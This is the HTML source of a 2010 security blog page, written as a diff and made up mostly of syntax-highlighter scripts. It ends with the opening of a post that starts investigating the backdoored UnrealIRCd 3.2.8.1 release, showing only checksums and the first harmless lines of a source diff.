+			{ regex: new RegExp("\\?[A-Za-z0-9_]+", 'g'), 				css: 'preprocessor' },
+			{ regex: new RegExp("[a-z0-9_]+:[a-z0-9_]+", 'g'), 			css: 'functions' },
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,		css: 'string' },
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,		css: 'string' },
+			{ regex: new RegExp(this.getKeywords(keywords),	'gm'),		css: 'keyword' }
+			];
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['erl', 'erlang'];
+
+	SyntaxHighlighter.brushes.Erland = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushJScript.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		var keywords =	'break case catch continue ' +
+						'default delete do else false  ' +
+						'for function if in instanceof ' +
+						'new null return super switch ' +
+						'this throw true try typeof var while with'
+						;
+
+		var r = SyntaxHighlighter.regexLib;
+		
+		this.regexList = [
+			{ regex: r.multiLineDoubleQuotedString,					css: 'string' },			// double quoted strings
+			{ regex: r.multiLineSingleQuotedString,					css: 'string' },			// single quoted strings
+			{ regex: r.singleLineCComments,							css: 'comments' },			// one line comments
+			{ regex: r.multiLineCComments,							css: 'comments' },			// multiline comments
+			{ regex: /\s*#.*/gm,									css: 'preprocessor' },		// preprocessor tags like #region and #endregion
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),	css: 'keyword' }			// keywords
+			];
+	
+		this.forHtmlScript(r.scriptScriptTags);
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['js', 'jscript', 'javascript'];
+
+	SyntaxHighlighter.brushes.JScript = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushJava.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		var keywords =	'abstract assert boolean break byte case catch char class const ' +
+						'continue default do double else enum extends ' +
+						'false final finally float for goto if implements import ' +
+						'instanceof int interface long native new null ' +
+						'package private protected public return ' +
+						'short static strictfp super switch synchronized this throw throws true ' +
+						'transient try void volatile while';
+
+		this.regexList = [
+			{ regex: SyntaxHighlighter.regexLib.singleLineCComments,	css: 'comments' },		// one line comments
+			{ regex: /\/\*([^\*][\s\S]*)?\*\//gm,						css: 'comments' },	 	// multiline comments
+			{ regex: /\/\*(?!\*\/)\*[\s\S]*?\*\//gm,					css: 'preprocessor' },	// documentation comments
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,		css: 'string' },		// strings
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,		css: 'string' },		// strings
+			{ regex: /\b([\d]+(\.[\d]+)?|0x[a-f0-9]+)\b/gi,				css: 'value' },			// numbers
+			{ regex: /(?!\@interface\b)\@[\$\w]+\b/g,					css: 'color1' },		// annotation @anno
+			{ regex: /\@interface\b/g,									css: 'color2' },		// @interface keyword
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),		css: 'keyword' }		// java keyword
+			];
+
+		this.forHtmlScript({
+			left	: /(&lt;|<)%[@!=]?/g, 
+			right	: /%(&gt;|>)/g 
+		});
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['java'];
+
+	SyntaxHighlighter.brushes.Java = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushPerl.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		// Contributed by David Simmons-Duffin and Marty Kube
+	
+		var funcs = 
+			'abs accept alarm atan2 bind binmode chdir chmod chomp chop chown chr ' + 
+			'chroot close closedir connect cos crypt defined delete each endgrent ' + 
+			'endhostent endnetent endprotoent endpwent endservent eof exec exists ' + 
+			'exp fcntl fileno flock fork format formline getc getgrent getgrgid ' + 
+			'getgrnam gethostbyaddr gethostbyname gethostent getlogin getnetbyaddr ' + 
+			'getnetbyname getnetent getpeername getpgrp getppid getpriority ' + 
+			'getprotobyname getprotobynumber getprotoent getpwent getpwnam getpwuid ' + 
+			'getservbyname getservbyport getservent getsockname getsockopt glob ' + 
+			'gmtime grep hex index int ioctl join keys kill lc lcfirst length link ' + 
+			'listen localtime lock log lstat map mkdir msgctl msgget msgrcv msgsnd ' + 
+			'oct open opendir ord pack pipe pop pos print printf prototype push ' + 
+			'quotemeta rand read readdir readline readlink readpipe recv rename ' + 
+			'reset reverse rewinddir rindex rmdir scalar seek seekdir select semctl ' + 
+			'semget semop send setgrent sethostent setnetent setpgrp setpriority ' + 
+			'setprotoent setpwent setservent setsockopt shift shmctl shmget shmread ' + 
+			'shmwrite shutdown sin sleep socket socketpair sort splice split sprintf ' + 
+			'sqrt srand stat study substr symlink syscall sysopen sysread sysseek ' + 
+			'system syswrite tell telldir time times tr truncate uc ucfirst umask ' + 
+			'undef unlink unpack unshift utime values vec wait waitpid warn write';
+    
+		var keywords =  
+			'bless caller continue dbmclose dbmopen die do dump else elsif eval exit ' +
+			'for foreach goto if import last local my next no our package redo ref ' + 
+			'require return sub tie tied unless untie until use wantarray while';
+    
+		this.regexList = [
+			{ regex: new RegExp('#[^!].*$', 'gm'),					css: 'comments' },
+			{ regex: new RegExp('^\\s*#!.*$', 'gm'),				css: 'preprocessor' }, // shebang
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,	css: 'string' },
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,	css: 'string' },
+			{ regex: new RegExp('(\\$|@|%)\\w+', 'g'),				css: 'variable' },
+			{ regex: new RegExp(this.getKeywords(funcs), 'gmi'),	css: 'functions' },
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),	css: 'keyword' }
+		    ];
+
+		this.forHtmlScript(SyntaxHighlighter.regexLib.phpScriptTags);
+	}
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases		= ['perl', 'Perl', 'pl'];
+
+	SyntaxHighlighter.brushes.Perl = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushPhp.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		var funcs	=	'abs acos acosh addcslashes addslashes ' +
+						'array_change_key_case array_chunk array_combine array_count_values array_diff '+
+						'array_diff_assoc array_diff_key array_diff_uassoc array_diff_ukey array_fill '+
+						'array_filter array_flip array_intersect array_intersect_assoc array_intersect_key '+
+						'array_intersect_uassoc array_intersect_ukey array_key_exists array_keys array_map '+
+						'array_merge array_merge_recursive array_multisort array_pad array_pop array_product '+
+						'array_push array_rand array_reduce array_reverse array_search array_shift '+
+						'array_slice array_splice array_sum array_udiff array_udiff_assoc '+
+						'array_udiff_uassoc array_uintersect array_uintersect_assoc '+
+						'array_uintersect_uassoc array_unique array_unshift array_values array_walk '+
+						'array_walk_recursive atan atan2 atanh base64_decode base64_encode base_convert '+
+						'basename bcadd bccomp bcdiv bcmod bcmul bindec bindtextdomain bzclose bzcompress '+
+						'bzdecompress bzerrno bzerror bzerrstr bzflush bzopen bzread bzwrite ceil chdir '+
+						'checkdate checkdnsrr chgrp chmod chop chown chr chroot chunk_split class_exists '+
+						'closedir closelog copy cos cosh count count_chars date decbin dechex decoct '+
+						'deg2rad delete ebcdic2ascii echo empty end ereg ereg_replace eregi eregi_replace error_log '+
+						'error_reporting escapeshellarg escapeshellcmd eval exec exit exp explode extension_loaded '+
+						'feof fflush fgetc fgetcsv fgets fgetss file_exists file_get_contents file_put_contents '+
+						'fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype '+
+						'floatval flock floor flush fmod fnmatch fopen fpassthru fprintf fputcsv fputs fread fscanf '+
+						'fseek fsockopen fstat ftell ftok getallheaders getcwd getdate getenv gethostbyaddr gethostbyname '+
+						'gethostbynamel getimagesize getlastmod getmxrr getmygid getmyinode getmypid getmyuid getopt '+
+						'getprotobyname getprotobynumber getrandmax getrusage getservbyname getservbyport gettext '+
+						'gettimeofday gettype glob gmdate gmmktime ini_alter ini_get ini_get_all ini_restore ini_set '+
+						'interface_exists intval ip2long is_a is_array is_bool is_callable is_dir is_double '+
+						'is_executable is_file is_finite is_float is_infinite is_int is_integer is_link is_long '+
+						'is_nan is_null is_numeric is_object is_readable is_real is_resource is_scalar is_soap_fault '+
+						'is_string is_subclass_of is_uploaded_file is_writable is_writeable mkdir mktime nl2br '+
+						'parse_ini_file parse_str parse_url passthru pathinfo print readlink realpath rewind rewinddir rmdir '+
+						'round str_ireplace str_pad str_repeat str_replace str_rot13 str_shuffle str_split '+
+						'str_word_count strcasecmp strchr strcmp strcoll strcspn strftime strip_tags stripcslashes '+
+						'stripos stripslashes stristr strlen strnatcasecmp strnatcmp strncasecmp strncmp strpbrk '+
+						'strpos strptime strrchr strrev strripos strrpos strspn strstr strtok strtolower strtotime '+
+						'strtoupper strtr strval substr substr_compare';
+
+		var keywords =	'abstract and array as break case catch cfunction class clone const continue declare default die do ' +
+						'else elseif enddeclare endfor endforeach endif endswitch endwhile extends final for foreach ' +
+						'function include include_once global goto if implements interface instanceof namespace new ' +
+						'old_function or private protected public return require require_once static switch ' +
+						'throw try use var while xor ';
+		
+		var constants	= '__FILE__ __LINE__ __METHOD__ __FUNCTION__ __CLASS__';
+
+		this.regexList = [
+			{ regex: SyntaxHighlighter.regexLib.singleLineCComments,	css: 'comments' },			// one line comments
+			{ regex: SyntaxHighlighter.regexLib.multiLineCComments,		css: 'comments' },			// multiline comments
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,		css: 'string' },			// double quoted strings
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,		css: 'string' },			// single quoted strings
+			{ regex: /\$\w+/g,											css: 'variable' },			// variables
+			{ regex: new RegExp(this.getKeywords(funcs), 'gmi'),		css: 'functions' },			// common functions
+			{ regex: new RegExp(this.getKeywords(constants), 'gmi'),	css: 'constants' },			// constants
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),		css: 'keyword' }			// keyword
+			];
+
+		this.forHtmlScript(SyntaxHighlighter.regexLib.phpScriptTags);
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['php'];
+
+	SyntaxHighlighter.brushes.Php = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushPlain.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['text', 'plain'];
+
+	SyntaxHighlighter.brushes.Plain = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushPython.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		// Contributed by Gheorghe Milas and Ahmad Sherif
+	
+		var keywords =  'and assert break class continue def del elif else ' +
+						'except exec finally for from global if import in is ' +
+						'lambda not or pass print raise return try yield while';
+
+		var funcs = '__import__ abs all any apply basestring bin bool buffer callable ' +
+					'chr classmethod cmp coerce compile complex delattr dict dir ' +
+					'divmod enumerate eval execfile file filter float format frozenset ' +
+					'getattr globals hasattr hash help hex id input int intern ' +
+					'isinstance issubclass iter len list locals long map max min next ' +
+					'object oct open ord pow print property range raw_input reduce ' +
+					'reload repr reversed round set setattr slice sorted staticmethod ' +
+					'str sum super tuple type type unichr unicode vars xrange zip';
+
+		var special =  'None True False self cls class_';
+
+		this.regexList = [
+				{ regex: SyntaxHighlighter.regexLib.singleLinePerlComments, css: 'comments' },
+				{ regex: /^\s*@\w+/gm, 										css: 'decorator' },
+				{ regex: /(['\"]{3})([^\1])*?\1/gm, 						css: 'comments' },
+				{ regex: /"(?!")(?:\.|\\\"|[^\""\n])*"/gm, 					css: 'string' },
+				{ regex: /'(?!')(?:\.|(\\\')|[^\''\n])*'/gm, 				css: 'string' },
+				{ regex: /\+|\-|\*|\/|\%|=|==/gm, 							css: 'keyword' },
+				{ regex: /\b\d+\.?\w*/g, 									css: 'value' },
+				{ regex: new RegExp(this.getKeywords(funcs), 'gmi'),		css: 'functions' },
+				{ regex: new RegExp(this.getKeywords(keywords), 'gm'), 		css: 'keyword' },
+				{ regex: new RegExp(this.getKeywords(special), 'gm'), 		css: 'color1' }
+				];
+			
+		this.forHtmlScript(SyntaxHighlighter.regexLib.aspScriptTags);
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['py', 'python'];
+
+	SyntaxHighlighter.brushes.Python = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushRuby.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		// Contributed by Erik Peterson.
+	
+		var keywords =	'alias and BEGIN begin break case class def define_method defined do each else elsif ' +
+						'END end ensure false for if in module new next nil not or raise redo rescue retry return ' +
+						'self super then throw true undef unless until when while yield';
+
+		var builtins =	'Array Bignum Binding Class Continuation Dir Exception FalseClass File::Stat File Fixnum Fload ' +
+						'Hash Integer IO MatchData Method Module NilClass Numeric Object Proc Range Regexp String Struct::TMS Symbol ' +
+						'ThreadGroup Thread Time TrueClass';
+
+		this.regexList = [
+			{ regex: SyntaxHighlighter.regexLib.singleLinePerlComments,	css: 'comments' },		// one line comments
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,		css: 'string' },		// double quoted strings
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,		css: 'string' },		// single quoted strings
+			{ regex: /\b[A-Z0-9_]+\b/g,									css: 'constants' },		// constants
+			{ regex: /:[a-z][A-Za-z0-9_]*/g,							css: 'color2' },		// symbols
+			{ regex: /(\$|@@|@)\w+/g,									css: 'variable bold' },	// $global, @instance, and @@class variables
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),		css: 'keyword' },		// keywords
+			{ regex: new RegExp(this.getKeywords(builtins), 'gm'),		css: 'color1' }			// builtins
+			];
+
+		this.forHtmlScript(SyntaxHighlighter.regexLib.aspScriptTags);
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['ruby', 'rails', 'ror', 'rb'];
+
+	SyntaxHighlighter.brushes.Ruby = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushSql.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		var funcs	=	'abs avg case cast coalesce convert count current_timestamp ' +
+						'current_user day isnull left lower month nullif replace right ' +
+						'session_user space substring sum system_user upper user year';
+
+		var keywords =	'absolute action add after alter as asc at authorization begin bigint ' +
+						'binary bit by cascade char character check checkpoint close collate ' +
+						'column commit committed connect connection constraint contains continue ' +
+						'create cube current current_date current_time cursor database date ' +
+						'deallocate dec decimal declare default delete desc distinct double drop ' +
+						'dynamic else end end-exec escape except exec execute false fetch first ' +
+						'float for force foreign forward free from full function global goto grant ' +
+						'group grouping having hour ignore index inner insensitive insert instead ' +
+						'int integer intersect into is isolation key last level load local max min ' +
+						'minute modify move name national nchar next no numeric of off on only ' +
+						'open option order out output partial password precision prepare primary ' +
+						'prior privileges procedure public read real references relative repeatable ' +
+						'restrict return returns revoke rollback rollup rows rule schema scroll ' +
+						'second section select sequence serializable set size smallint static ' +
+						'statistics table temp temporary then time timestamp to top transaction ' +
+						'translation trigger true truncate uncommitted union unique update values ' +
+						'varchar varying view when where with work';
+
+		var operators =	'all and any between cross in join like not null or outer some';
+
+		this.regexList = [
+			{ regex: /--(.*)$/gm,												css: 'comments' },			// one line and multiline comments
+			{ regex: SyntaxHighlighter.regexLib.multiLineDoubleQuotedString,	css: 'string' },			// double quoted strings
+			{ regex: SyntaxHighlighter.regexLib.multiLineSingleQuotedString,	css: 'string' },			// single quoted strings
+			{ regex: new RegExp(this.getKeywords(funcs), 'gmi'),				css: 'color2' },			// functions
+			{ regex: new RegExp(this.getKeywords(operators), 'gmi'),			css: 'color1' },			// operators and such
+			{ regex: new RegExp(this.getKeywords(keywords), 'gmi'),				css: 'keyword' }			// keyword
+			];
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['sql'];
+
+	SyntaxHighlighter.brushes.Sql = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+
+</script>
+<script type='text/javascript'>
+/* shBrushXml.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		function process(match, regexInfo)
+		{
+			var constructor = SyntaxHighlighter.Match,
+				code = match[0],
+				tag = new XRegExp('(&lt;|<)[\\s\\/\\?]*(?<name>[:\\w-\\.]+)', 'xg').exec(code),
+				result = []
+				;
+		
+			if (match.attributes != null) 
+			{
+				var attributes,
+					regex = new XRegExp('(?<name> [\\w:\\-\\.]+)' +
+										'\\s*=\\s*' +
+										'(?<value> ".*?"|\'.*?\'|\\w+)',
+										'xg');
+
+				while ((attributes = regex.exec(code)) != null) 
+				{
+					result.push(new constructor(attributes.name, match.index + attributes.index, 'color1'));
+					result.push(new constructor(attributes.value, match.index + attributes.index + attributes[0].indexOf(attributes.value), 'string'));
+				}
+			}
+
+			if (tag != null)
+				result.push(
+					new constructor(tag.name, match.index + tag[0].indexOf(tag.name), 'keyword')
+				);
+
+			return result;
+		}
+	
+		this.regexList = [
+			{ regex: new XRegExp('(\\&lt;|<)\\!\\[[\\w\\s]*?\\[(.|\\s)*?\\]\\](\\&gt;|>)', 'gm'),			css: 'color2' },	// <![ ... [ ... ]]>
+			{ regex: SyntaxHighlighter.regexLib.xmlComments,												css: 'comments' },	// <!-- ... -->
+			{ regex: new XRegExp('(&lt;|<)[\\s\\/\\?]*(\\w+)(?<attributes>.*?)[\\s\\/\\?]*(&gt;|>)', 'sg'), func: process }
+		];
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['xml', 'xhtml', 'xslt', 'html'];
+
+	SyntaxHighlighter.brushes.Xml = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-191882-2']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=9099779&amp;zx=3f136503-a513-4bc0-9c3f-a34fa514a099' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=9099779&amp;zx=3f136503-a513-4bc0-9c3f-a34fa514a099' rel='stylesheet'/></noscript>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+</head>
+<body>
+<div class='navbar no-items section' id='navbar'>
+</div>
+<div id='outer-wrapper'><div id='wrap2'>
+<!-- skip links for text browsers -->
+<span id='skiplinks' style='display:none;'>
+<a href='#main'>skip to main </a> |
+      <a href='#sidebar'>skip to sidebar</a>
+</span>
+<div id='header-wrapper'>
+<div class='header section' id='header'><div class='widget Header' data-version='1' id='Header1'>
+<div id='header-inner'>
+<div class='titlewrapper'>
+<h1 class='title'>
+<a href='https://blog.stalkr.net/'>
+StalkR's Blog
+</a>
+</h1>
+</div>
+<div class='descriptionwrapper'>
+<p class='description'><span>Blog of a security enthusiast</span></p>
+</div>
+</div>
+</div></div>
+</div>
+<div id='content-wrapper'>
+<div id='crosscol-wrapper' style='text-align:center'>
+<div class='crosscol no-items section' id='crosscol'></div>
+</div>
+<div id='main-wrapper'>
+<div class='main section' id='main'><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Sunday, June 13, 2010</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='9099779' itemprop='blogId'/>
+<meta content='4574631714866481251' itemprop='postId'/>
+<a name='4574631714866481251'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+UnrealIRCd 3.2.8.1 backdoored, investigation
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-4574631714866481251' itemprop='description articleBody'>
+<a href="http://www.unrealircd.com/">UnrealIRCd</a> is a great <a href="http://en.wikipedia.org/wiki/Internet_Relay_Chat">IRC</a> server software (daemon) and very popular among mid-sized networks because of its highly advanced features and the fact that it is cross-platform (at least Windows/Linux fully supported).<br />
+<br />
+Yesterday, <a href="http://archives.neohapsis.com/archives/fulldisclosure/2010-06/0269.html">bad news</a>: <a href="http://forums.unrealircd.com/viewtopic.php?t=6562">some versions of Unreal3.2.8.1.tar.gz contain a backdoor</a> because download mirrors have been compromised.. since november 2009! Read the official <a href="http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt">security advisory</a> for more information. Other <a href="http://www.irc-junkie.org/2010-06-12/some-unrealircd-3-2-8-1-downloads-trojaned/">websites</a> are reporting the issue, someone even provided a small <a href="http://www.xzibition.com/fix-unreal.sh">shell script</a> to fix the flaw: it basically reverts the changes with diff+patch, make clean & make again, so you just have to restart your IRCd. If you're running an UnrealIRCd you should double check your installation because <a href="http://www.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb">some</a> <a href="http://www.exploit-db.com/exploits/13853/">exploits</a> are already widespread, as well as an <a href="http://nmap.org/book/nse.html">NSE</a> (Nmap Scripting Engine) <a href="http://seclists.org/nmap-dev/2010/q2/att-833/irc-unrealircd-backdoor.nse">script</a> (<a href="http://seclists.org/nmap-dev/2010/q2/833">seen</a> on <a href="http://seclists.org/nmap-dev">nmap-dev</a> mailing list) to scan & kill IRC servers infected by the backdoor.<br />
+<br />
+Oh and funny thing on <a href="http://news.yahoo.com/s/pcworld/20100613/tc_pcworld/linuxtrojanraisesmalwareconcerns">Yahoo news</a> and <a href="http://news.techworld.com/security/3226723/linux-trojan-hits-unreal-irc-raises-malware-concerns/?cmpid=TD1N7&amp;no1x1">techworld</a> (who seems to have copy/pasted yahoo news..):<br />
+<pre class="brush: plain">The good news [...] is that the Trojan is in a <b>game</b> download so it should
+have no bearing on Linux in a business setting.
+Unreal is a popular first-person shooter <b>game</b>--similar to Doom or Quake.
+</pre>No, <a href="http://en.wikipedia.org/wiki/Unreal">Unreal</a> is not <a href="http://en.wikipedia.org/wiki/UnrealIRCd">UnrealIRCd</a>. :)<br />
+<br />
+As a curious person I wanted to know more about this backdoor, so let's investigate.<br />
+<a name="more"></a><br />
+<h3>Read the source luke</h3><br />
+<a href="http://stalkr.net/files/unrealircd/Unreal3.2.8.1-vs-Unreal3.2.8.1_backdoor.diff">Compare</a> the <a href="http://stalkr.net/files/unrealircd/Unreal3.2.8.1.tar.gz">good</a> and <a href="http://stalkr.net/files/unrealircd/Unreal3.2.8.1_backdoor.tar.gz">backdoored</a> versions:<br />
+<pre class="brush: bash">$ md5sum Unreal3.2.8.1*
+7b741e94e867c0a7370553fd01506c66  Unreal3.2.8.1.tar.gz
+752e46f2d873c1679fa99de3f52a274d  Unreal3.2.8.1_backdoor.tar.gz
+
+$ diff -urN Unreal3.2.8.1 Unreal3.2.8.1_backdoor
+</pre><pre class="brush: diff">diff -urN Unreal3.2.8.1/include/struct.h Unreal3.2.8.1_backdoor/include/struct.h
+--- Unreal3.2.8.1/include/struct.h&nbsp; &nbsp; &nbsp; 2009-04-13 13:03:57.000000000 +0200
++++ Unreal3.2.8.1_backdoor/include/struct.h&nbsp; &nbsp;&nbsp; 2009-04-13 13:03:00.000000000 +0200
+@@ -430,6 +430,7 @@
+ #endif
+
+ /* Fake lag exception */
++
+ #define IsNoFakeLag(x)&nbsp; &nbsp; &nbsp; ((x)-&gt;flags & FLAGS_NOFAKELAG)
+ #define SetNoFakeLag(x)&nbsp; &nbsp;&nbsp; ((x)-&gt;flags |= FLAGS_NOFAKELAG)
+ #define ClearNoFakeLag(x)&nbsp;&nbsp; ((x)-&gt;flags &= ~FLAGS_NOFAKELAG)
+@@ -448,6 +449,7 @@
+ #else
